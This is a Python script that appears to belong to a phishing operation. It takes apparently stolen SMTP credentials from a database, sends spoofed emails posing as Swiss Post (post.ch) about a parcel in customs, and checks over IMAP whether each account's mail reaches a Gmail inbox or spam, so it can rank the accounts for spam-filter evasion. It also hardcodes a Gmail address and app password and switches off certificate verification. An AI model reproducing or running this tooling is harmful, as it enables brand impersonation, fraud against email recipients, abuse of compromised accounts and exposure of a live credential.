#!/usr/bin/env python3
"""
RE-CHECK: Verify all INBOX-classified SMTPs actually deliver to inbox.
Sends a spoof email from each SMTP → Gmail checker → waits → checks IMAP.
Reclassifies any that land in SPAM.
"""
import sqlite3
import time
import uuid
import ssl
import smtplib
import imaplib
import re
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from concurrent.futures import ThreadPoolExecutor
import threading

DB_PATH = "/opt/darkvasend/bustgo-hunt.db"

GMAIL_CHECKER = {
    "email": "Malik.elmathy@gmail.com",
    "password": "pqnpfihscgxonwwf",
    "imap_host": "imap.gmail.com",
    "imap_port": 993,
}

TEMPLATE = {
    "from_name": "Post CH SA",
    "from_email": "notifications@post.ch",
    "subject": "Votre envoi est en cours de dedouanement",
    "reply_to": "notifications@post.ch",
}

HTML_BODY = "<html><body><p>Swiss Post verification test</p></body></html>"


def strip_tld(email):
    if "@" not in email:
        return email
    local, domain = email.rsplit("@", 1)
    parts = domain.split(".")
    return f"{local}@{parts[0]}" if len(parts) > 1 else email


def send_test(smtp_info, marker, checker_email):
    """Send spoof test email. Returns (success, error)."""
    host = smtp_info["smtp_host"]
    port = smtp_info["smtp_port"]
    user = smtp_info["smtp_user"]
    password = smtp_info["smtp_password"]

    # Strip TLD for spoof
    actual_from = strip_tld(TEMPLATE["from_email"])
    tracked_subject = f"{TEMPLATE['subject']} [RECHECK-{marker}]"

    msg = MIMEMultipart("alternative")
    msg["Subject"] = tracked_subject
    msg["From"] = f"{TEMPLATE['from_name']} <{actual_from}>"
    msg["To"] = checker_email
    msg["Reply-To"] = TEMPLATE["reply_to"]
    msg["Message-ID"] = f"<rc-{marker}@recheck>"
    msg["Date"] = time.strftime("%a, %d %b %Y %H:%M:%S %z")
    msg["X-Mailer"] = "Microsoft Outlook 16.0"
    msg["MIME-Version"] = "1.0"
    msg.attach(MIMEText("Swiss Post verification", "plain", "utf-8"))
    msg.attach(MIMEText(HTML_BODY, "html", "utf-8"))

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        if port == 465:
            server = smtplib.SMTP_SSL(host, port, timeout=15, context=ctx)
        else:
            server = smtplib.SMTP(host, port, timeout=15)
            server.ehlo()
            try:
                server.starttls(context=ssl.create_default_context())
                server.ehlo()
            except Exception:
                pass
        server.login(user, password)
        server.sendmail(user, [checker_email], msg.as_string())
        server.quit()
        return True, ""
    except smtplib.SMTPAuthenticationError:
        return False, "AUTH_FAIL"
    except smtplib.SMTPDataError as e:
        return False, f"DATA_{e.smtp_code}"
    except smtplib.SMTPSenderRefused as e:
        return False, f"SENDER_{e.smtp_code}"
    except Exception as e:
        return False, f"{type(e).__name__}: {str(e)[:50]}"


def check_imap_delivery(markers):
    """Check SPAM first, then INBOX for each marker."""
    results = {}
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        imap = imaplib.IMAP4_SSL(
            GMAIL_CHECKER["imap_host"], GMAIL_CHECKER["imap_port"],
            ssl_context=ctx, timeout=30,
        )
        imap.login(GMAIL_CHECKER["email"], GMAIL_CHECKER["password"])

        # SPAM FIRST
        try:
            st, _ = imap.select("[Gmail]/Spam", readonly=True)
            if st == "OK":
                for m in markers:
                    st2, ids = imap.search(None, f'SUBJECT "RECHECK-{m}"')
                    if st2 == "OK" and ids[0] and ids[0].strip():
                        results[m] = "spam"
        except Exception as e:
            print(f"  [IMAP SPAM ERROR] {e}")

        # THEN INBOX
        remaining = [m for m in markers if m not in results]
        if remaining:
            try:
                st, _ = imap.select("INBOX", readonly=True)
                if st == "OK":
                    for m in remaining:
                        st2, ids = imap.search(None, f'SUBJECT "RECHECK-{m}"')
                        if st2 == "OK" and ids[0] and ids[0].strip():
                            results[m] = "inbox"
            except Exception as e:
                print(f"  [IMAP INBOX ERROR] {e}")

        imap.logout()
    except Exception as e:
        print(f"  [IMAP CONNECT ERROR] {e}")
    return results


def main():
    db = sqlite3.connect(DB_PATH, timeout=10)
    db.row_factory = sqlite3.Row

    # Get all INBOX-classified SMTPs
    rows = db.execute(
        "SELECT id, domain, provider, smtp_host, smtp_port, smtp_user, smtp_password, context "
        "FROM found_creds WHERE auth_ok=1"
    ).fetchall()

    inbox_smtps = []
    for r in rows:
        ctx = r["context"] or ""
        if "SPOOF_INBOX" in ctx or "BASIQUE_INBOX" in ctx:
            inbox_smtps.append(dict(r))

    if not inbox_smtps:
        print("Aucun SMTP INBOX a verifier.")
        return

    print(f"=== RE-CHECK: {len(inbox_smtps)} SMTP INBOX ===\n")

    # Phase 1: Send test from each SMTP
    checker_email = GMAIL_CHECKER["email"]
    markers = {}  # marker -> smtp_info

    print("PHASE 1: Envoi des tests...")
    for s in inbox_smtps:
        marker = uuid.uuid4().hex[:8]
        cred_id = s["id"]
        ok, err = send_test(s, marker, checker_email)
        if ok:
            markers[marker] = s
            print(f"  #{cred_id} {s['smtp_host']} {s['smtp_user'][:25]} -> ENVOYE (marker={marker})")
        else:
            print(f"  #{cred_id} {s['smtp_host']} {s['smtp_user'][:25]} -> ECHEC: {err}")

    if not markers:
        print("\nAucun email envoye — tous les SMTP sont morts.")
        db.close()
        return

    # Phase 2: Wait 90s for Gmail to process
    print(f"\nPHASE 2: Attente 90s (classification Gmail)...")
    time.sleep(90)

    # Phase 3: First IMAP check (SPAM first)
    print(f"\nPHASE 3: Check IMAP ({len(markers)} markers)...")
    results = check_imap_delivery(list(markers.keys()))
    
    found = len(results)
    missing = [m for m in markers if m not in results]
    print(f"  1er check: {found}/{len(markers)} trouves")

    # Retry missing after 30s
    if missing:
        print(f"  {len(missing)} manquants — retry dans 30s...")
        time.sleep(30)
        r2 = check_imap_delivery(missing)
        results.update(r2)
        print(f"  2eme check: {len(r2)} trouves supplementaires")

    # Phase 4: Double-check INBOX markers after 45s
    inbox_found = [m for m, v in results.items() if v == "inbox"]
    if inbox_found:
        print(f"\nPHASE 4: DOUBLE-CHECK {len(inbox_found)} markers INBOX (45s)...")
        time.sleep(45)
        recheck = check_imap_delivery(inbox_found)
        for m, new_status in recheck.items():
            if new_status == "spam":
                results[m] = "spam"
                print(f"  {m}: INBOX -> SPAM (reclassifie!)")

    # Phase 5: Report + reclassify in DB
    print(f"\n{'='*50}")
    print(f"  RE-CHECK RESULTATS")
    print(f"{'='*50}\n")

    reclassified = 0
    confirmed_inbox = 0
    dead = 0

    for marker, s in markers.items():
        cred_id = s["id"]
        delivery = results.get(marker, "not_found")
        old_ctx = s["context"] or ""
        
        # Extract the label part after SPOOF_INBOX_ or BASIQUE_INBOX_
        label_part = ""
        for prefix in ["SPOOF_INBOX_", "BASIQUE_INBOX_"]:
            if prefix in old_ctx:
                label_part = old_ctx.split(prefix, 1)[-1]
                break
        if not label_part:
            label_part = s.get("provider", "manual")

        if delivery == "inbox":
            confirmed_inbox += 1
            print(f"  #{cred_id} {s['smtp_host']} {s['smtp_user'][:25]} -> INBOX CONFIRME")
        elif delivery == "spam":
            reclassified += 1
            # Reclassify: SPOOF_INBOX -> SPOOF_SPAM (or BASIQUE_INBOX -> BASIQUE_SPAM)
            if "SPOOF_INBOX" in old_ctx:
                new_ctx = old_ctx.replace("SPOOF_INBOX", "SPOOF_SPAM")
            elif "BASIQUE_INBOX" in old_ctx:
                new_ctx = old_ctx.replace("BASIQUE_INBOX", "BASIQUE_SPAM")
            else:
                new_ctx = f"Manual: SPOOF_SPAM_{label_part}"
            
            db.execute("UPDATE found_creds SET context=? WHERE id=?", (new_ctx, cred_id))
            print(f"  #{cred_id} {s['smtp_host']} {s['smtp_user'][:25]} -> RECLASSIFIE SPAM (etait INBOX)")
        else:
            dead += 1
            print(f"  #{cred_id} {s['smtp_host']} {s['smtp_user'][:25]} -> NOT FOUND (email pas arrive)")

    db.commit()
    db.close()

    print(f"\n{'='*50}")
    print(f"  INBOX confirmes:  {confirmed_inbox}")
    print(f"  Reclassifies SPAM: {reclassified}")
    print(f"  Non arrives:       {dead}")
    print(f"{'='*50}")


if __name__ == "__main__":
    main()
